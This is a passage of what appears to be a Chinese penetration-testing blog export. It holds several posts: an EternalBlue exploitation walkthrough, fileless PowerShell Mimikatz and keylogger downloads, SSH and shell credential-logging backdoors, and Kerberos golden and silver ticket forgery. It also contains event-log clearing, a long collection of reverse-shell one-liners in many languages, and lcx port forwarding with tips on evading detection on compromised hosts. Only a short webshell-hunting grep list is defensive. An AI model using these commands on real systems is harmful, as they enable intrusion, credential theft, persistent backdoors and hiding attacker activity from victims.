    <content type="text"><![CDATA[受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0等。 实战利用：攻击机：kali 目标机：win764位 打开msf 搜索msf17-010模块 search msf17-010 use auxiliary/scanner/smb/smb_ms17_010 show option查看配置选项，需要配置的参数，RHOSTS,THREADS： set RHOSTS 192.168.209.0/24 set threads 10 run 扫描探测192.168.209网段下存在漏洞的主机： 发现了一个开445端口有漏洞的主机，接下来进入漏洞利用模块并设置payload use exploit/windows/smb/ms17_010_eternalblue 设置TCP连接 set payload windows/x64/meterpreter/reverse_tcp 用options查看需要配置的选项rhost和lhost 配置完后进行攻击： exploit 成功进入 通过shell对目标机进行控制 net user abc abc /add 将用户abc添加入管理组 net localgroup administrators abc /add 开启远程桌面功能 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f Kali远程桌面连接Win7 rdesktop 192.168.209.160:3389 漏洞修补 打齐补丁 关闭135、139、445端口。]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>metasploit</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[powershell gethash]]></title>
    <url>%2F2018%2F12%2F05%2Fpowershell-gethash%2F</url>
    <content type="text"><![CDATA[使用powershell远程调用来抓取hash。 在线导hash: powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&apos;);Get-PassHashes 在线导明文 powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz]]></content>
      <categories>
        <category>骚操作</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux查找webshell]]></title>
    <url>%2F2018%2F12%2F05%2FLinux%E6%9F%A5%E6%89%BEwebshell%2F</url>
    <content type="text"><![CDATA[在网站目录差找如下关键字： grep -Rn &quot;shell_exec *(&quot; /var/www grep -Rn &quot;base64_decode *(&quot; /var/www grep -Rn &quot;phpinfo *(&quot; /var/www grep -Rn &quot;system *(&quot; /var/www grep -Rn &quot;php_uname *(&quot; /var/www grep -Rn &quot;chmod *(&quot; /var/www grep -Rn &quot;fopen *(&quot; /var/www grep -Rn &quot;fclose *(&quot; /var/www grep -Rn &quot;readfile *(&quot; /var/www grep -Rn &quot;edoced_46esab *(&quot; /var/www grep -Rn &quot;eval *(&quot; /var/www grep -Rn &quot;pwd&quot; /var/www grep -Rn &quot;pass&quot; /var/www grep -Rn &quot;pw&quot; /var/www grep -Rn 密码&quot; /var/www grep -rn：忽略大小写 find: find /www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\{\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos;]]></content>
      <categories>
        <category>shell</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[命令行下的信息收集]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[域用户信息 whoami /user 查看当前用户的用户名和sid whoami /groups 查看当前用户所属的用户组 whoami /priv 查看当前用户的权限 用户及用户组信息 net group /domain 查看域中的用户组 net group &quot;domain admins&quot; /domain 获得域管理员列表 net group &quot;domain controllers&quot; /domain 获得域控制器列表 net group &quot;domain computers&quot; /domain 获得所有域成员计算机列表 net user /domain 查看域中的用户 net accounts /domain 获得域密码策略、密码长短等信息。 net view /domain 查看所有域或工作组 离线凭证收集-提取域用户hash 域用户hash存储在ntds.dit里。他的位置一般在域控上%WINDIR%\ntds\ntds.dit 使用wmic识别安装到系统中的补丁情况 wmic qfe get description,installedOn 识别正在运行的服务 sc query type= service 或 net start 识别开机启动的程序，包括路径 wmic startup list full ping探测存活主机 for /L %I in (100,1,254) DO @ping -w 1 -n 1 10.18.180.%I | findstr &quot;TTL=&quot; &gt;&gt; ping.txt 查看系统中网卡的IP地址和MAC地址 wmic nicconfig get ipaddress,macaddress 查看当前系统是否有屏保保护，延迟是多少 wmic desktop get screensaversecure,screensavertimeout 查看系统中开放的共享 wmic share get name,path 或 net share 查看系统中开启的日志 wmic nteventlog get path,filename,writeable 清除相关的日志（这里是全部清除） wevtutil cl &quot;windows powershell&quot; wevtutil cl &quot;security&quot; wevtutil cl &quot;system&quot; 查看系统中安装的软件以及版本 wmic product get name,version 查看某个进程的详细信息 （路径，命令行参数等） wmic process where name=&quot;chrome.exe&quot; list full 终止一个进程 wmic process where name=&quot;xshell.exe&quot; call terminate ntsd -c q -p 进程的PID 显示系统中的曾经连接过的无线密码 netsh wlan show profiles netsh wlan show profiles name=&quot;profiles的名字&quot; key=clear 查看当前系统是否是VMWARE wmic bios list full | find /i &quot;vmware&quot; 可以用wmic /?查看具体用法 Process -进程信息 Service -服务 Share -共享 DataFile -文件及目录 Volume -磁盘卷列表 一些收集工具setspn.exeSetspn是一款管理spn的命令行软件。我们可以用它来查看某台主机或账户的SPN。 查看账户college的SPN Setspn -L college 查看当前域中的所有SPN Setspn -T * -Q */* ADFind.exeAdfind是一款活动目录查询工具。 http://www.joeware.net/freetools/tools/adfind/ 列出域控列表 Adfind.exe -sc dclist 查询域中活动的主机，输出主机名和域名 Adfind.exe -sc computers_active name dnshostname 获取域内主机信息 AdFind.exe -b dc=school,dc=com -f &quot;objectcategory=computer&quot; 查询域中主机的spn AdFind.exe -b cn=computers,dc=school,dc=com servicePrincipalName Netview.exeNetview 能够收集域内主机共享、IP、是否为域控等信息。 https://github.com/mubix/netview 将主机名（或IP地址）列表保存在文件host.txt中，使用netview -f host.txt来信息收集。 Netsses.exe工具能够列举目标主机上的NetBIOS session，通常不依赖于管理员权限（-full参数列出所有会话需要管理权限）。 http://www.joeware.net/freetools/tools/netsess/index.htm 如果有一台域成员（192.168.1.128）机器net view了本机的共享（192.168.1.130），那么它与本机之间会存在一个netbios会话，可以使用下列命令来查看会话用户： netsess-h 192.168.1.130-c\\192.168.1.128 这里的-h参数指定了服务器的地址，-c参数则指定了客户端的地址]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[密码记录工具]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[在渗透测试过程当中，我们往往需要获取到一个合法用户的凭证。有时候，通常使用的一些密码抓取工具（如mimikatz、wce等）可能会由于各种原因失效（例如杀软或者权限的问题），这时候我们如果想获取凭证，可以通过键盘记录等方式来得到密码。这种方式需要目标用户交互，比较看运气。 Windows Powershellpowershell -ep bypass iex (new-object net.webclient).downloadstring(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt Get-Keystrokes.ps1https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1 远程下载执行： powershell -ep bypass iex (new-object net.webclient).downloadstring(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt Invoke-CredentialsPhish.ps1Invoke-CredentialsPhish是nishang中的一个钓鱼工具，它能在目标桌面上弹出一个认证窗口。不管是点击关闭，确定，还是取消，这个窗口都会反复弹出，除非用户输入正确的密码或是直接kill掉powershell进程。 powershell -ep bypass iex (new-object net.webclient).downloadstring(&apos;https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt Openssh后门Linux alias在~/.bashrc下添加如下一行： alias ssh=&apos;strace -o /var/tmp/.syscache-`date +&apos;%Y-%m-%d+%H:%m:%S&apos;`.log -s 4096 ssh&apos; 再使更改生效： source ~/.bashrc apt-get install strace //若缺少此软件，需要安装 当有用户使用ssh命令时，会生成一个Log文件： 但是内容有点多，需要筛选一下： cat .syscache-2018-11-20+14\:11\:54.log | grep &quot;read(4&quot; sh2logubuntu下载sh2log： wget http://packetstorm.foofus.com/UNIX/loggers/sh2log-1.0.tgz 解压压缩包： tar –xvf sh2log-1.0.tgz Cd进入sh2log-1.0文件夹 安装libx11-dev sudo apt-get install libxll-dev 安装完成后，编译sh2log： 输入make linux 新建一个shell脚本，脚本内容如下： sudo mkdir /bin/shells/ sudo cp -p /bin/{sh,bash} /bin/shells/ sudo rm -f /bin/{sh,bash} sudo cp -p sh2log /bin/bash sudo cp -p sh2log /bin/sh ./sh2logd 保存脚本，添加执行权限： chmod +x ./1.sh 运行脚本： ./1.sh 启动后，可以用ps -ef|grep sh2logd来检查是否成功启动，它会在安装目录下生成一个bin文件 查看的话可以用parser这个工具查看：./parser xxxxx.bin 输入bash，打开一个新的she11，随意输入一些命令 之后使用文件夹中的parser工具， ./parser sh2log-xxxxx.bin]]></content>
      <categories>
        <category>内网渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[密码提取神器--mimikatz]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E7%A5%9E%E5%99%A8-mimikatz%2F</url>
    <content type="text"><![CDATA[mimikatz抓取用户密码https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181203 mimikatz是由C语言编写的开源小工具，于2014年4月发起。它的功能非常强大，支持从Windows系统内存中提取明文密码、哈希、PIN码和Kerberos凭证，以及pass-the-hash、pass-the-ticket、build Golden tickets等数种黑客技术。 mimikatz使用起来也非常简单，提取Windows系统的明文密码只需两行命令： privilege::debug #提升权限 sekurlsa::logonpasswords #抓取密码 输入aaa::aaa，可展示所有模块 可采用log命令，保存为日志 要以管理员身份进入mimikatz 用cmd5去爆破NTML值 要钱，算了…. 修改注册表，启用摘要密码支持 需要创建UseLogonCredential，并赋值为1 重新登录后，再次运行就可以抓取到明文密码啦。 mimikatz令牌窃取Windows有两种类型的Token： Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录) Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹) 两种token只在系统重启后清除 具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效 使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token以管理员身份运行mimikatz——&gt;使用privilege::debug获取debug权限——&gt;使用token::elevate模仿system用户的令牌——&gt;使用token::list列出令牌——&gt;使用 lsadump::sam来获取sam数据库中的密码——&gt;使用token::revert恢复令牌 Mimikatz后渗透在kerberos认证中，如果需要向某个服务发起认证，首先需要获取到TGT，之后拿着这张TGT去获得ST。微软的kerberos认证支持rc4加密，它会使用服务器的ntlm hash作为加密票据的密钥。那么当获取到ST后，就能尝试暴力破解服务器的密码hash。 Pass-The-Hashsekurlsa::pth /domain:GUOXIANG.com /user:administrator /ntlm 保存的hash Pass-The-Ticket查看当前用户的ticket Kerberos::list 导出当前用户的ticket Kerberos::list /export 查看所有ticket Sekurlsa::tickets 导出所有ticket Sekurlsa::tickets /export 获得需要的票据后，可以在其他机器上导入此票据： Kerberos:ptt 票据名 导入不依赖管理员权限，比较方便。假设导入了域管的票据，则我们可以dir域控的c$共享：Dir\\DC\c$来进行测试。 需要注意的是UNC路径中需要使用主机名DC，而不能使用172.17.1.1这样的ip地址，否则可能会被拒绝访问。 Golden Ticket黄金票据（golden ticket）是一种为任意用户生成TGT票据的方法。只要获取kribtgt账户的密码HASH、域sid、域名和域账户，黄金票据即可离线生成，而且不受TGT生命周期的影响（默认10小时，最多续订7天） kribtgt账户的密码HASHkribtgt账户的密码hash存储在域控制器上，因此需要获得域管理员权限。 获取krbtgt的hash： lsadump::dcsync /domain:GUOXIANG.com /user:krbtgt 我们可以使用aes256_hmac这一行的hash。 域sid域的sid可以使用工具psgetsid获取，也可以在获取域成员shell后使用whoami /user获取。例如域用户sid为S-1-5-21-3187487621-2881332574-933047120-1105，则1105之前的就是域sid 生成黄金票据获取到上述信息后，就可以使用mimikatz的kerberos::golden生成黄金票据 Kerberos::golden /user：guoxiang /sid:域sid /aes256:krbtgt账户aes256加密的hash /domain:GUOXIANG.com /ticket:golden.kirbi 当需要使用黄金票据的时候，使用mimikatz： Kerberos:ptt golden.kribi Silver Ticket黄金票据伪造的是TGT，而白银票据则伪造ST。 由于ST针对特定的服务，因此白银票据只能用来认证特定服务，而黄金票据则可以用于认证任何kerberos服务。 使用白银票据并不需要和域控通信（使用ST直接和目标服务器通信），而使用黄金票据则需要与域控通信（需要使用伪造的TGT来获取ST） 生成白银票据生成白银票据需要： 域名 sid 用户名：可以是任意用户 服务名：如cifs、ldap等 目标计算机账户密码hash（这里需要win-xxxxxx$这类账户的ntlm hash，否则会导致认证失败） 获取到上述信息后： kerberos::golden /admin:guoxiang /domain:GUOXIANG.com /id:1105 /sid:S-1-5-21-2236738896-1661306322-1924668396 target:guoxiang.GUOXIANG.com /rc4:35493c328494b75aff81d2ffcf173787 /service:LDAP /ptt 到处白银票据。 Mimikatz中的dcsync通过drsr 协议向域控发起复制用户凭证的请求。使用这种方式，无需登录到域控上，只通过网络就能够获取用户的凭证。前面讲解的黄金和白银票据可以实现对域控的持久访问，配合dcsync即可在域成员主机上提取凭证。 Powershell版的Mimikatz一句话执行： powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos; 无文件执行： powershell Iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos;]]></content>
      <categories>
        <category>内网渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[nc命令使用]]></title>
    <url>%2F2018%2F12%2F04%2Fnc%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Netcat(nc):NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。 Nc可以在两台设备上面相互交互，即侦听模式/传输模式 Telnet功能 获取banner信息 传输文本信息 传输文件/目录 加密传输文件，默认不加密 远程控制 加密所有流量 流媒体服务器 远程克隆硬盘 常用参数： -n 以数字形式表示的IP地址 -v 显示详细信息 [使用=vv获取更详细的信息 -l 监听入站信息 -p port 本地端口 -q secs 在标准输入且延迟后退出 -c shell commands shell模式 -u UDP模式 -s addr 本地源地址 -h 获取帮助信息 -z I/O 模式 [扫描时使用] 实例：正向连接A:nc -lp port -c bash B:nc ip port A将自己的Bash发给B 反向连接A:nc -lp port B:nc ip port -c bash B将自己的Bash发给A win下Bash换成cmd 通常反向连接 比较常用，因为防火墙的存在，让目标机主动发送shell 使用NC进行信息收集简单的建立连接，就是侦听模式和传输模式 nc -lp port 监听指定端口号 nc -nv ip port 连接对方tcp端口，默认情况下，双方可以发送文本信息 收集目标机上的进程信息 nc -l -p 4444 &gt;wing.txt 将远程发送过来的内容保存在本地 Ps aux |nc -nv ip port -q 1 标准输入完成后delay一秒钟，会发送到侦听端 NC传输文件/目录 nc -lp 4444 &gt;1.txt 1.txt就是你要保存的文件名 自定义 nc -nv ip port &lt;1.txt -q 1 将文件发送给侦听端 侦听端的文件名最好按照文件本身来命名 将目录打包： tar -cvf - 目录名/|nc -lp port -q 1 将目录解包 nc -nv ip port |tar -xvf - NC端口扫描 nc -nvz ip 1-65535 NC文件加密传输apt-get install mcrypt A： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb &gt;文件名 B：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt;文件名|nc -nv ip port -q 1 B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出。主要是利用mcrypt进行加密 NC端口扫描nc -nvz ip 1-65535 默认使用tcp进行扫描 NC复制磁盘A:nc -lp port |dd of=/dev/sda B: dd if=/dev/sda | nc -nc ip port -q 1 If是input filter Of 是output filter B将数据复制到A挂载的硬盘上]]></content>
      <categories>
        <category>命令使用</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[常见的漏洞端口]]></title>
    <url>%2F2018%2F12%2F04%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%AB%AF%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[21 ftp 主要看是否支持匿名，也可以跑弱口令 22 ssh SSH远程登录协议 23 telnet telnet终端仿真协议 80 web 常见web漏洞以及是否为一些管理后台 389 LDAP（轻量目录访问协议）存在匿名访问 443 openssl 心脏滴血以及一些web漏洞测试 873 rsync 主要看是否支持匿名，也可以跑弱口令 1099 JAVArmi 命令执行 1433 SQl server 1521 Oracle 弱口令 3306 MySQL 能够外联数据库 3389 RDP 远程桌面看看能不能弱口令 5432 PostGreSQL 弱口令爆破 6379 redis 一般无认证，可直接访问 7001，7002 weblogic的console口 8080 Tomcat\Jboss 弱口令，Jboss匿名访问 8080-8090 常见Web端口 9000 fast-cgi对外可以getshell 9043 WebSphere 弱口令爆破 27017 MongoDB 未授权访问]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[反弹shell的几种姿势]]></title>
    <url>%2F2018%2F12%2F04%2F%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[powershell反弹shellpowercat反弹shell环境说明： 攻击机1：KALI 192.168.209.159 攻击机2：ubuntu 192.168.209.155 目标机：win7 192.168.209.160 可以在GitHub上下载powercat： https://github.com/besimorhino/powercat powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat。 攻击机开启监听： nc -lvp 666 或者用powercat监听： powercat -l -p 666 目标机执行反弹cmd shell： powershell IEX (New-Object System.Net.Webclient).DownloadString (&apos;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&apos;); powercat -c 192.168.209.159 -p 6666 -e cmd nishang反弹shellNishang(https://github.com/samratashok/nishang )是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。 Reverse TCP shell攻击机1（192.168.209.159）开启监听： nc -lvp 666 目标机执行： powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666 或者将nishang下载到攻击者本地： powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666 Reverse UDP shell攻击机1（192.168.209.159）开启监听： nc -lvup 123 目标机执行： powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/123.ps1&apos;); Invoke-PowerShellUdp -Reverse -IPAddress 192.168.209.159 -port 123 123.ps1为Invoke-PowerShellUdp.ps1，搭建了个网站IP为10.60.17.46 Reverse ICMP shell需要利用icmpsh_m.py (https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。 攻击机1下载icmpsh_m.py文件，并执行 python icmpsh_m.py [Attacker IP] [Victim IP] sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包 python icmpsh_m.py 192.168.209.159 192.168.209.160 #开启监听 目标机执行： powershell iex(New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/Invoke-PowerShellIcmp.ps1&apos;);Invoke-PowerShellIcmp -IPAddress 192.168.209.159 自定义powershell函数反弹shell利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell，其实也是借鉴nishang中的Invoke-PowerShellTcpOneLine.ps1 攻击机1（192.168.209.159）开启监听： nc -lvp 2333 目标机执行： powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&apos;192.168.209.159&apos;,2333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot; 或者保存为lltest_tcp.ps1文件 powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/lltest_tcp.ps1&apos;);Invoke-lltestTcp lltest_tcp.ps1 如下： function Invoke-lltestTcp { $client = New-Object Net.Sockets.TCPClient(&apos;192.168.159.134&apos;,6666) $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0} while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i) $sendback = (iex $data 2&gt;&amp;1 | Out-String ) $sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2) $stream.Write($sendbyte,0,$sendbyte.Length) $stream.Flush() } $client.Close() } dnscat2 反弹DNS shelldnscat2(https://github.com/iagox86/dnscat2)是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(https://github.com/lukebaggett/dnscat2-powershell) 利用dnscat2 和 dnscat2-powershell实现反弹DNS shell: 攻击者2(Ubuntu 192.168.209.155)开启监听： ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.209.155&quot; --no-cache -e open -e open 不使用加密连接，默认使用加密 ruby dnscat2.rb —help 查看帮助 目标机执行： powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&apos;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.209.155 成功反弹shell后，攻击机2： session -i 1 #进入到session 1 shell #执行之后会新生成一个session 需要通过session -i 2 切换 session -i 2 Empire 结合office反弹shellEmpire(https://github.com/EmpireProject/Empire) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell 利用office 宏反弹shell攻击者(192.168.209.159)开启监听: uselistener http execute back usestager windows/macro http #生成payload execute 生成/tmp/macro 攻击代码后，新建一个word 创建宏 点击“文件”-“宏”-“创建”，删除自带的脚本，复制进去/tmp/macro文件内容，并保存为“Word 97-2003文档(.doc)”或者“启用宏的Word 文档(.docm)”文档，当诱导目标打开，执行宏后，即可成功反弹shell： 说明:需要开启宏或者用户手动启用宏。开启宏设置：“文件”-“选项”-“信任中心”,选择“启用所有宏” PowerSploit DLL注入反弹shellPowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell msfvenom生成dll后门目标机1执行： msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.209.159 lport=4449 -f dll -o /var/www/html/test.dll 目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp metasploit 设置payload 开启监听攻击机1执行： use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 192.168.209.159 set LPORT 4449 exploit 目标机远程下载powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程 目标执行： Get-Process #查看进程进程 IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.209.159/Invoke-DllInjection.ps1&apos;); Invoke-DllInjection -ProcessID 5448 -Dll C:\Users\郭翔\Desktop\test.dll metasploit反弹shell利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell 攻击者1(192.168.209.159)： msfconsole use exploit/multi/script/web_delivery set PAYLOAD windows/meterpreter/reverse_tcp set target 2 set LHOST 192.168.209.159 set LPORT 123 exploit 执行完exploit后会弹出一段payload，将这段payload复制到目标机 目标机执行： powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring (&apos;http://192.168.209.159:8080/1nLv5Znszan1&apos;); Cobalt strike反弹shell博客中有一个专门的文章对Cobalt strike做介绍。 bash版本：bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 注意某些linux不支持 这里shell由bash解析，有时候是由sh解析，不一定百发百中 这里&amp;在Linux shell中表示后台运行，当然这里0&gt;&amp;1不是这样,对于&amp;1更准确的说应该是文件描述符1,而1一般代表的就是STDOUT_FILENO perl版本:perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos; python版本：python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; php版本：php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos; ruby版本：ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos; nc版本：nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 nc 10.0.0.1 1234 &gt;/tmp/f nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999 java版本r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()]]></content>
      <categories>
        <category>shell</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[lcx使用:端口转发]]></title>
    <url>%2F2018%2F12%2F03%2Flcx%E4%BD%BF%E7%94%A8-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[端口映射在入侵内网的时候经常用到，特别是要登陆远程终端服务时，使用端口映射就非常方便。 Lcx.exe是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上,这样连接B机的3389就相当于连接A机的3389端口。Lcx程序多用于被控制计算机(肉鸡)处于内网的情况，被控制机可能中了木马程序，虽然能够进行控制，但还是没有使用远程终端登陆到本机进行管理方便，因此在很多情况下，都会想方设法在被控制计算机上开启3389端口，然后通过lcx等程序进行端口转发，进而在本地连接到被控制计算机的远程终端并进行管理和使用。 三个功能tran功能ran功能是端口转向功能，通过访问该端口可以直接与该主机或另一台的某一个端口进行通信。 例如： 本机端口转向：lcx -tran 55 127.0.0.1 3389 转向其他主机端口：肉机运行： lcx.exe -slave 10.60.17.46 55 192.168.209.160 3389 操作机运行： lcx.exe -listen 55 3389 【原来的图片丢了….只能借用一下别人的了】 在被控制计算机上使用netstat -an查看当前所有的连接时，可以看到被控制计算机时在跟自己进行远程终端连接，而实际的3389端口是跟本机的55端口进行连接的。 注意： 如果被控制计算机是服务器，则在登陆时可以直接进行登陆;如果被控制计算机是Windows XP系统，则最好选择用户不在计算机的时间进行登陆，否则容易被发现。 不要轻易在被控制计算机上建立账号，尤其是Windows XP，建立帐号后，会立即在登陆界面中进行显示。]]></content>
      <categories>
        <category>内网渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Cobalt Strike的使用]]></title>
    <url>%2F2018%2F12%2F03%2FCobalt-Strike%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
